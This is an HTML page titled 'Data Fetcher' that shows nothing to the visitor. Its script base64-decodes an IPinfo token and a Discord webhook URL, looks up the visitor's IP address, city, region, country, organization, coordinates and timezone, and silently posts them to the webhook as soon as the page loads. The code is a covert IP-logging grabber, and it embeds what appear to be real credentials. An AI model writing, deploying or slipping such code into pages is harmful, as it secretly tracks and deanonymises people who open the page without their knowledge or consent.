<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Fetcher</title>
</head>
<body>
    <script>
        // Encoded values for IPinfo token and webhook URL
        const encodedToken = 'YWZiY2U5OWUwOTk5ZWQ=';
        const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==';

        // Decode Base64 values
        const token = atob(encodedToken);
        const webhookUrl = atob(encodedWebhook);

        // Fetch IP data from IPinfo and send it to the Discord webhook
        async function fetchDataAndSend() {
            try {
                // Fetch IP info data
                const response = await fetch(`https://ipinfo.io/json?token=${token}`);
                const data = await response.json();

                // Prepare message payload
                const payload = {
                    content: `Location Data:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrganization: ${data.org}\nCoordinates: ${data.loc}\nTimezone: ${data.timezone}`
                };

                // Send data to Discord webhook
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Handle any errors silently
            }
        }

        // Execute the function
        fetchDataAndSend();
    </script>
</body>
</html>
